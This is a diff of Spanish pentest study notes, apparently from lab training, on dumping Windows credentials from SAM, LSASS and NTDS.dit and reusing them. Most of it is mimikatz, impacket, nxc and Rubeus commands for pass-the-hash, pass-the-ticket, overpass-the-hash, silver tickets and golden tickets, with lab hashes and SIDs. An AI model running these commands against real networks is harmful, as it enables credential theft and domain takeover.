@@ -1,7 +1,7 @@
 #Windows #bruteforce #passthehash #pastheticket #passthekey #dumpCredentials 
 # Técnicas para Dumpear Credenciales
 
-## 1. Dumpeando SAM
+## Dumpeando SAM
 Sirve principalmente para obtener credenciales de cuentas locales (sistemas no unidos a un AD). El valor que obtendremos aquí será el NT hash. Con el NT hash (o hash NTML) no importa si nos autenticamos utilizando el protocolo NTMLv1 ó NTMLv2. Si un usuario reutiliza esta contraseña en un AD, también se podrá hacer PtH en el AD. Debemos ser usuarios privilegiados en el sistema para poder realizar este tipo de ataque
 ### Desde la máquina comprometida
 #### Guardar información con `reg.exe` - Máquina comprometida
@@ -16,22 +16,22 @@ reg.exe save hklm\security C:\Users\public\security.save # opcional
 	```
 #### Coon mimikatz
 ```powershell
-.\mimikatz.exe privilege::debug lsadump::sam exit > dumpSAM
+.\mimikatz.exe privilege::debug lsadump::sam exit *> dumpSAM
 # A veces hay que elevar privilegios con token::elevate antes de lsamdump::sam
 ```
 ### Desde pwnbox
 #### Con `nxc`
 ```bash
-nxc smb $target -u <usuario> -p <contraseña> --sam
+nxc smb $target -u $username -p $password --sam
 ```
 #### Con impacket
 ```bash
-impacket-secretsdump <user>:<pass>@$target
+impacket-secretsdump $username:$password@$target
 ```
 
 ---
 
-## 2. Dumpeando LSASS
+## Dumpeando LSASS
 Se puede obtener información como la que sigue: 
 - Hashes NTML
 - Contraseñas en texto claro 
@@ -65,6 +65,14 @@ Se puede obtener información como la que sigue:
 pypykatz lsa minidump /path/to/lsass.dmp
 ```
 
+### con `nxc`
+- Con credenciales administrador...
+	```bash
+	nxc smb $target -u $username -p $password -M nanodump
+	# Quizás puede arrojar más información
+	nxc smb $target -u $username -p $password --lsa
+	```
+
 ### Mimikatz
 Utilizando `seurlsa::logonpasswrods` podemos acceder al proceso activo de LSASS y nos puede dar más información que el paso anterior
 ```powershell
@@ -72,7 +80,9 @@ Utilizando `seurlsa::logonpasswrods` podemos acceder al proceso activo de LSASS 
 privilege::debug
 sekurlsa::logonpasswords
 # o volcando la información en un archivo
-.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit> output.txt
+.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit *> dumpLSASS.txt
+# Podríamos encontrar claves kerberos y secretos LSA aquí
+.\mimikatz.exe privilege::debug lsadump::lsa /patch exit *> secrets_lsa.txt
 ```
 ### Mitigación credentialGuard - Obtención de credenciales en texto plano
 Cuando este está activado, no podemos recuperar los hashes de memoria. Solo está pensado para proteger a usuarios no locales
@@ -92,7 +102,7 @@ Cuando este está activado, no podemos recuperar los hashes de memoria. Solo est
 
 ---
 
-## 3. Dumpeando NTDS.dit
+## Dumpeando NTDS.dit
 
 Se muestra a continuación una tabla de la información que se puede extraer de NTDS y diferencias y similitudes con el voldado LSASS
 
@@ -120,16 +130,43 @@ Se muestra a continuación una tabla de la información que se puede extraer de 
    cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
    ```
 
-### Con `nxc` - Remotamente
+- Propuesta de offsec:
+	```powershell
+	# Utilizar vshadow con -nw: disable writers y -p: copy on disk
+	vshadow.exe -nw -p  C:
+	# aparecerá donde se ha creado la copia en:
+	# -Shadow copy device name: \\?\GLOBALROOT\..
+	# Copiamos la base de datos de AD a C:
+	copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+	# necesitamos guardar también SYSTEM para desencriptar la información
+	reg.exe save hklm\system c:\system.bak
+	# en la pwnbox:
+	impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL 
+	```
+### Con mimikatz
+```powershell
+# Todo ntds.dit
+lsadump::dcsync
+# o si queremos volcar la información de un solo usuario
+lsadump::dcsync /user:corp\Administrator
 ```
-nxc smb $target -u user -p password --ntds
+### Con `secretsdump`
+```bash
+# Todo ntds.dit
+impacket-secretsdump -just-dc corp.com/$username:$password@$dcip
+# Un solo usuario
+impacket-secretsdump -just-dc-user Administrator corp.com/$username:$password@$dcip
+```
+### Con `nxc` 
+```
+nxc smb $dcip -u $username -p $password --ntds
 ```
 
 ---
 
 # Ataques Posteriores
 
-## 1. Fuerza Bruta sobre Hashes NT
+## Fuerza Bruta sobre Hashes NT
 Puede tener sentido para reutilizar contraseñas posteriormente en otros servicios  o si hay políticas que bloquean Pth
 ### Extraer NTLM hashes de `secretsdump.txt`
 Suponiendo que el archivo `secretsdump.txt` es
@@ -147,8 +184,19 @@ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 
 ---
 
-## 2. Pass-the-Hash (PtH)
-### Con `mimikatz`
+## Pass-the-Hash (PtH)
+Necesita (por defecto están habilitadas estas opciones):
+- Conexión SMB
+- Función compartir archivos e impresoras habilitada
+- No funcionará si NTLM está deshabilitado y el equipo solo permite autenticación kerberos (por defecto está habilitada autenticación NTLM en Windows, excepto algunos Windows Server 2016+). Podemos comprobar si está habilitado con 
+	```powershell
+	Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel
+	# 0-2 → NTLM habilitado
+	# 3 → NTLMv2 habilitado, pero NTLMv1 bloqueado
+	# 4-5 → NTLM bloqueado, solo Kerberos
+	```
+### Windows
+#### Con `mimikatz`
 ```powershell
 #privilege::debug
 sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM_HASH /run:cmd.exe
@@ -174,7 +222,7 @@ evil-winrm -i $target -u Administrator -H <NTLM_hash>
 #### Con `impacket-psexec` - SMB
 Por la naturaleza de psexec se obtiene una shell con privilegios de `system`
 ```bash
-impacket-psexec administrator@$target -hashes :<NTLM_hash>
+impacket-psexec admcinistrator@$target -hashes :<NTLM_hash>
 ```
 #### Con `impacket-wmiexec` - SMB
 Se ejecuta una shell con privilegios del usuario que la lanza
@@ -211,7 +259,7 @@ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministrat
 ```
 
 ---
-## 3. Pass-the-Ticket (PtT)
+##  Pass-the-Ticket (PtT)
 Para este tipo de ataque se necesitan extraer tickets de tipo `TGT` ó `Service ticket`. En la práctica trabajaremos con `TGTs`, ya que son más valiosos y si podemos extraer un `Service ticket` es muy probable que podamos extraer también un `TGT`.
 ### Exportar Tickets
 En cualquiera de los casos necesitaremos permisos de administrador
@@ -260,29 +308,29 @@ kerberos::ptt <ticket.kirbi>
 rubeus.exe ptt /ticket:<ticket.kirbi>
 ```
 ##### Con ticket base64
-```cmd-session
+```powershell
 Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
 ```
 
 
 ---
 
-## 4. OverPass-the-Hash (PtK)
+## OverPass-the-Hash 
+(Pensar en un PTH, pero en kerberos)
+La idea de este ataque es que, en lugar de usar el hash NTLM para autenticarse directamente como en un **Pass-the-Hash (PTH)** tradicional, se usa el hash NTLM para **generar un ticket Kerberos (TGT) en memoria**, lo que permite autenticarse en servicios basados en Kerberos (como SMB, WinRM, RDP, HTTP, etc.)
 Para un ataque **OverPass-the-Hash necesitamos 
-1. Clave`RC4_HMAC`: Es en esencia el hash NTML del usuario reutilizado como clave Kerberos
-2. claves Kerberos `AES256_HMAC` : Derivada de la contraseña del usuario. Preferida en entornos modernos
-Esta información se puede obtener del volcado `LSASS` ó de `NTDS.dit`. 
-
-### Extraer Kerberos Keys
-#### Mimikatz
-```
-mimikatz.exe
-privilege::debug
-sekurlsa::ekeys
-```
+1. Que el usuario que vamos a suplantar tenga una sesión activa en kerberos
+2. Clave`RC4_HMAC`: Es en esencia el hash NTML del usuario reutilizado como clave Kerberos (preferible extraerla de LSASS, ya que el usuario debe estar autenticado y la clave extraída es más fiable)
+### Extraer clave 
+- Cuando queremos extraer la clave `rc4_hmac` podemos hacerlo directamente de la SAM:
+	```powershell
+	.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit *> dumpLSASS.txt
+	También podríamos extraer esta clave (y además la AES256) con 
+	sekurlsa::ekeys
+	```
 
 ### Generar un TGT 
-Los ejemplos que se proporcionan a continuación son con una clave `RC4_HMAC`. Si en su lugar tuviéramos una clave  `AES256_HMAC` , en lugar de poner `/rc4:<hash>`, deberíamos poner `/aes256:<clave>`
+Los ejemplos que se proporcionan a continuación son con una clave `RC4_HMAC`. Si en su lugar tuviéramos una clave  `AES256_HMAC` , en lugar de poner `/rc4:<hash>` (ó `ntlm:<hash>`), deberíamos poner `/aes256:<clave>`
 #### Con Rubeus
 ```bash
 rubeus.exe tgtdeleg /user:<username> /rc4:<NTLM_hash>
@@ -296,15 +344,110 @@ rubeus.exe asktgs /ticket:<TGT.kirbi> /service:<service>/<host>
 ### En un solo paso 
 #### Con `mimikatz`
 Este comando realiza un **OverPass-the-Hash**. Utiliza el hash NTLM (`RC4_HMAC`) para generar credenciales Kerberos, las inyecta en LSASS, y abre un `cmd.exe` autenticado como el usuario objetivo.
-```cmd-session
-mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+```powershell
+.\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:powershell.exe" exit
 ```
+- Esto nos creará una sesión que nos permitirá ejecutar comandos como el usuario al que hemos suplantado (ojo: `whoami` mostraría que somos el usuario que ha iniciado esta conexión, ya que esta utilidad solo comprueba el proceso actual y no los tickets kerberos). Podemos conectarnos ahora en otro sistema con `psexec` como si fueramos el usuario que hemos suplantado del siguiente modo, ya que tenemos caragado el ticket tgt en memoria: 
+	```powershell
+	.\PsExec64.exe \\files04 cmd
+	```
 #### Con `rubeus`
 Similar al comando anterior
 ```cmd-session
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
 ```
----
+
+## Pass the key
+
+`sekurlsa::logonpasswords` **solo muestra el hash NTLM** pero **no las claves AES**, lo que hace que el OPTH falle en dominios donde NTLM no es suficiente. Este ataque es muy similar al ataque over pass the hash, solo que en vez de utilizar el hash NTLM, utiliza una clave **clave AES-256 o AES-128** para autenticarse en Kerberos. 
+### Extraer Kerberos Keys
+#### Mimikatz
+```
+mimikatz.exe
+privilege::debug
+sekurlsa::ekeys
+```
+
+Con las claves extraídas [[Credenciales en Windows#OverPass-the-Hash#Generar un TGT| hacer un ataque como en overpass the hash]]
+
+## Silver ticket (Ataque TGS)
+### Información necesaria
+Crea un **TGS (Ticket Granting Service) falso** para un servicio específico en un servidor. Normalmente este tipo de ataque se realizará después de encontrar un hash de un servicio. Necesitamos lo siguiente
+
+1. **Encontrar servicios SPN** 
+	```bash
+	 Get-DomainUser * -spn | select samaccountname, serviceprincipalname 
+	```
+2. **Hash NTLM del usuario que ejecuta el servicio en el servidor (como `HTTP`, `CIFS`, `MSSQLSvc`, etc.)** (`/rc4:<hash_rc4_servicio>`)
+	```powershell
+	.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit *> dumpLSASS.txt
+	# Buscar el hash del servicio en dumpLSASS.txt
+	```
+3. **SID del dominio** (`/sid:S-1-5-21-XXXX`)
+	```powershell
+	Get-DomainSID
+	# También podríamos del siguiente modo (sin tomar los últimos valores): 
+	([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
+	# O buscando el valor escribiendo... (sin tomar los últimos valores)
+	whoami /user
+	```
+4. **Nombre del dominio**
+	```powershell
+	# Deberíamos conocerlo, pero podemos obtenerlo igualmente con:
+	[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+	```
+5. **Nombre del servidor donde está el servicio**
+	```powershell
+	# Aparece en el SPN. Supongamos servicio iss_service
+	 Get-DomainUser  -spn "*iis_*" | select  serviceprincipalname 
+	# resultado
+	{HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}
+	# En este caso el nombre del servidor sería web04.corp.com
+	```
+6. **Nombre del servicio en SPN (Ejemplo: `HTTP`, `CIFS`, `MSSQLSvc`)** (`/service:http`)
+	```powershell
+	# Aparece en el SPN. Supongamos servicio iss_service
+	 Get-DomainUser  -spn "*iis_*" | select  serviceprincipalname 
+	# resultado
+	{HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}
+	# En este caso el nombre del servicio sería HTTP
+	```
+7. **Usuario que suplantas (opcional)** 
+	```
+	USUARIO CON EL QUE TENEMOS ACCESO A PS	
+	```
+### Creación de tiquet
+#### Inyección directa 
+- Inyección en memoria con mimikatz
+	```powershell
+	kerberos::golden /sid:<SID_DEL_DOMINIO> /domain:<NOMBRE_DOMINIO> /ptt /target:<NOMBRE_SERVIDOR> /service:<NOMBRE_SERVICIO> /rc4:<HASH_NTLM> /user:<USUARIO>
+	```
+- Ejemplo:
+	```powershell
+	kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+	```
+- Podemos comprobar que el ticket está cargado en memoria escribiendo 
+	```powershell
+	klist
+	```
+- Utilización del servicio: `UseDefaultCredentials`. Si añadimos la flag `-UseDefaultCredentials` al servicio que estemos ejecutando, el servidor exige autenticación kerberos (y los tickets que hay en memoria)
+	```powershell
+	iwr -UseDefaultCredentials http://web04
+	```
+#### Creación de ticket
+- Creación del ticket
+	```powerview
+	kerberos::golden /sid:<SID_DEL_DOMINIO> /domain:<NOMBRE_DOMINIO> /target:<NOMBRE_SERVIDOR> /service:<NOMBRE_SERVICIO> /rc4:<HASH_NTLM> /user:<USUARIO> /ticket:ticket.kirbi
+	```
+- Inyección del ticket
+	```powershell
+	kerberos::ptt silver_ticket.kirbi
+	```
+- Utilización del servicio: `UseDefaultCredentials`. Si añadimos la flag `-UseDefaultCredentials` al servicio que estemos ejecutando, el servidor exige autenticación kerberos (y los tickets que hay en memoria)
+	```powershell
+	iwr -UseDefaultCredentials http://web04
+	```
+
 ## Golden ticket 
 ### Teoría
 Cuando se genera un TGT, este se genera con la información del usuario como 
@@ -332,19 +475,26 @@ Sin embargo, aunque no tengamos acceso a la clave del Dominio, en la práctica p
 Para obetner este hash necesitamos privilegios de **administrador de dominio** o acceso a una cuenta con permisos de **replicación del directorio** (por ejemplo, **DCSync**).
 #### Mimikatz (DCSync)
 Debemos tener acceso administrativo o privilegios de replicación en el dominio
-```cmd-session
+```powershell
 mimikatz.exe
 privilege::debug
 lsadump::dcsync /domain:dominio.local /user:krbtgt
 ```
+#### Mimikatz 
+- Podría ocurrir que las credenciales de `krbtgt` estuvieran almacenadas en algún equipo distinto al DC, por lo que podríamos obtenerlas del siguiente modo: 
+	```powershell
+	mimikatz.exe
+	privilege::debug
+	lsadump::lsa /patch
+	```
 #### Desde NTDS.dit
 Si tenemos credenciales de acceso administrativo al dc. Podemos hacerlo como se muestra en el apartado de dumpeo ó utilizanodo `secretsdump`
-```cmd-session
-secretsdump.py -just-dc-user krbtgt@<dc_ip> -outputfile hashes.txt
+```powershell
+impacket-secretsdump -just-dc-user krbtgt corp.com/$username:$password@$dcip -outputfile hashKrbtgt.txt
 ```
 #### Desde LSASS
 Con acceso al DC y sin privilegios elevados podríamos conseguir esta información (debemos obtener `lsass.dmp`)
-```
+```powershell
 mimikatz.exe
 sekurlsa::minidump
 lsass.dmp sekurlsa::logonpasswords
@@ -353,7 +503,7 @@ lsass.dmp sekurlsa::logonpasswords
 #### Información que debemos extraer
 La información que encontraremos es de la siguiente manera
 ```textplain
-`krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60:::`
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60:::
 ```
 Si tenemos la información de mas hashes en un archivo llamado `hashes.txt`, podemos obtener el hash `krbtgt` del siguiente modo: 
 ```bash
@@ -361,14 +511,20 @@ grep -oP '^krbtgt:\d+:[a-f0-9]{32}:\K[a-f0-9]{32}' hashes.txt
 ```
 
 ### Generar golden ticket
-Necesitamos pasar los siguientes parámetros:
+Necesitamos pasar los siguientes parámetros ([[Domain Trust#Escalada parent Domain con extraSIDs attack| ejemplo de ataque golden ticket]]):
 - **`/user:Administrator`:** Usuario que quieres suplantar 
 - **`/domain:dominio.local`:** Nombre del dominio.
 - **`/sid:S-1-5-21-XXXX`:** SID del dominio.
 - **`/krbtgt:<hash_krbtgt>`:** Hash NTLM de la cuenta `KRBTGT`.
-- **`/groups:512`:** Grupo al que pertenece el usuario (por ejemplo, `512` es el SID de **Domain Admins**).
+- **`/groups:512`:** Grupo al que pertenece el usuario (por ejemplo, `512` es el SID de **Domain Admins**). No parece obligatorio
 ```powershell
-kerberos::golden /user:Administrator /domain:dominio.local /sid:S-1-5-21-XXXX /krbtgt:<hash_krbtgt> /groups:512 /ticket:golden.kirbi
+# En shell de mimikatz
+privilege::debug
+# Una vez hayamos obtenido el ticket, puede convenir limpiar todos los tickets que existen, para no entrar en conflicto
+kerberos::purge
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+# Después de generarlo, abrimos una nueva sesión de linea de comandos con las credenciales del ticket inyectado
+misc::cmd
 ```
 
 ### Inyección en memoria del golden Ticket
